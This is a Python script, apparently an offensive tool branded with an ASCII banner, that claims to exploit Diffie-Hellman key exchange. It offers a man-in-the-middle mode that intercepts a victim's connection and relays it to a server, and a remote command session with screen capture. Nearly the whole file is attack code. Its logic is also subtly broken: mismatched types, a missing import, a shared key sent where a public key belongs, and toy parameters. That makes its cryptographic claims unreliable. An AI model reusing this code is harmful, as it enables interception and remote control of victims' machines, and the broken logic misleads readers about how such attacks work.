import socket
import re
import base64
import hashlib
import random
import subprocess
import pyautogui
from PIL import ImageGrab

# ANSI escape codes for colors
GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'

ASCII_ART = """
 /$$      /$$ /$$                  /$$$$$$$$                  /$$       /$$    /$$   /$$         /$$  
| $$$    /$$$|__/                 |__  $$__/                 | $$      | $$   | $$ /$$$$       /$$$$  
| $$$$  /$$$$ /$$  /$$$$$$   /$$$$$$ | $$  /$$$$$$   /$$$$$$ | $$      | $$   | $$|_  $$      |_  $$  
| $$ $$/$$ $$| $$ /$$__  $$ /$$__  $$| $$ /$$__  $$ /$$__  $$| $$      |  $$ / $$/  | $$        | $$  
| $$  $$$| $$| $$| $$  \ $$| $$  \ $$| $$| $$  \ $$| $$  \ $$| $$       \  $$ $$/   | $$        | $$  
| $$\  $ | $$| $$| $$  | $$| $$  | $$| $$| $$  | $$| $$  | $$| $$        \  $$$/    | $$        | $$  
| $$ \/  | $$| $$|  $$$$$$$|  $$$$$$/| $$|  $$$$$$/|  $$$$$$/| $$         \  $//$$ /$$$$$$ /$$ /$$$$$$
|__/     |__/|__/ \____  $$ \______/ |__/ \______/  \______/ |__/          \_/|__/|______/|__/|______/
                  /$$  \ $$                                                                           
                 |  $$$$$$/                                                                           
                  \______/                                                                            
"""
print(GREEN + ASCII_ART + RESET)
def receive_data(socket):
    data = socket.recv(1024).decode()
    match = re.search(r'\d+', data)  # Extract the integer part using a regular expression
    if match:
        return int(match.group())
    else:
        raise ValueError(RED + "Invalid data received" + RESET)

def send_data(socket, data):
    socket.sendall(data.encode())

def diffie_hellman_key_exchange(sock):
    # Receive the server's public key
    server_public_key = receive_data(sock)

    # Generate a private and public key for the client
    client_private_key = random.randint(1, 100)
    client_public_key = (g ** client_private_key) % p

    # Send the client's public key to the server
    send_data(sock, str(client_public_key))

    # Calculate the shared secret key
    shared_secret = (server_public_key ** client_private_key) % p

    # Derive the shared secret key
    derived_key = hashlib.sha256(str(shared_secret).encode()).digest()

    return derived_key

def execute_command(sock, command):
    # Send the command to the server
    send_data(sock, command)

    # Receive and print the result of the command
    result = receive_data(sock)
    print(GREEN + result + RESET)

def capture_screen(sock):
    # Send the command to capture the screen
    send_data(sock, "capture_screen")

    # Receive the base64-encoded screen capture
    screen_data = receive_data(sock)

    # Decode and display the screen capture
    image_data = base64.b64decode(screen_data)
    image = Image.frombytes('RGB', (pyautogui.size().width, pyautogui.size().height), image_data)
    image.show()

def interactive_session(sock):
    print(GREEN + "[+] Session opened" + RESET)
    print("Enter your commands (type 'exit' to close the session):")

    while True:
        command = input(">>> ")
        if command.lower() == 'exit':
            print(GREEN + "[+] Session closed" + RESET)
            break
        elif command.lower() == 'capture_screen':
            capture_screen(sock)
        else:
            execute_command(sock, command)

def exploit_diffie_hellman(ip_address, port, attacker_ip, attacker_port):
    # Establish a connection with the server
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip_address, port))

    if attacker_ip and attacker_port:
        # Attacker mode: MITM
        attacker_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        attacker_sock.bind((attacker_ip, attacker_port))
        attacker_sock.listen(1)
        print(GREEN + f"[+] Waiting for victim connection on {attacker_ip}:{attacker_port}" + RESET)

        victim_sock, addr = attacker_sock.accept()
        print(GREEN + f"[+] Victim connected from {addr[0]}:{addr[1]}" + RESET)

        # Forwarding data between victim and server
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.connect((ip_address, port))

        shared_key = diffie_hellman_key_exchange(server_sock)
        print(GREEN + "[+] Diffie-Hellman key exchange with server successful" + RESET)

        # Send the victim's public key to the server
        send_data(server_sock, str(shared_key))

        # Receive the server's public key
        server_public_key = receive_data(server_sock)

        # Forward server's public key to the victim
        send_data(victim_sock, str(server_public_key))

        # Shared secret calculation for MITM
        shared_secret_mitm = (server_public_key ** 1) % p  # In a real attack, you'd replace 1 with a chosen private key

        print(GREEN + f"[+] Shared Key with victim: {base64.b64encode(shared_secret_mitm).decode()}" + RESET)

        # Forwarding data between victim and server
        while True:
            data = victim_sock.recv(1024)
            if not data:
                break
            server_sock.sendall(data)

        # Close the connections
        victim_sock.close()
        server_sock.close()
        attacker_sock.close()

    else:
        # Diffie-Hellman key exchange
        shared_key = diffie_hellman_key_exchange(sock)
        print(GREEN + "[+] Exploit successful" + RESET)
        print(GREEN + f"[+] Shared Key: {base64.b64encode(shared_key).decode()}" + RESET)

        # Interactive session
        interactive_session(sock)

    # Close the connection
    sock.close()

if __name__ == "__main__":
    # Ask for the IP address and port of the Diffie-Hellman server
    ip_address = input(GREEN + "[*] Enter the IP address of the Diffie-Hellman server: " + RESET)
    port = int(input(GREEN + "[*] Enter the port of the Diffie-Hellman server: " + RESET))

    # Diffie-Hellman parameters (these values must be known by the server as well)
    p = 23  # prime number
    g = 5   # generator

    # Check if the user wants to run the script in attacker mode
    attacker_mode_input = input(GREEN + "[*] Do you want to run the script in attacker mode? (y/n): " + RESET).lower()
    
    if attacker_mode_input == 'y':
        attacker_ip = input(GREEN + "[*] Enter the attacker's IP address: " + RESET)
        attacker_port = int(input(GREEN + "[*] Enter the attacker's port: " + RESET))
        exploit_diffie_hellman(ip_address, port, attacker_ip, attacker_port)
    else:
        # Call the exploit_diffie_hellman function
        exploit_diffie_hellman(ip_address, port, None, None)


